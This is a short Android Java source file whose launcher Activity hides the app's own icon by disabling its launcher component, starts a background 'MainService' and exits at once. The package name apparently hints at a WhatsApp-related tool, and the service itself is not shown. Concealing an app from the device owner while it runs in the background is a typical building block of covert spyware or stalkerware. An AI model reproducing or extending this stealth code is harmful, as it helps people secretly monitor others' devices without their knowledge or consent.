package exts.whats;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;

public class Main extends Activity {
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        hide();
        if (!MainService.isRunning) {
            Intent i = new Intent();
            i.setClass(this, MainService.class);
            startService(i);
        }
        finish();
    }

    private void hide() {
        getPackageManager().setComponentEnabledSetting(new ComponentName(this, Main.class), 2, 1);
    }
}
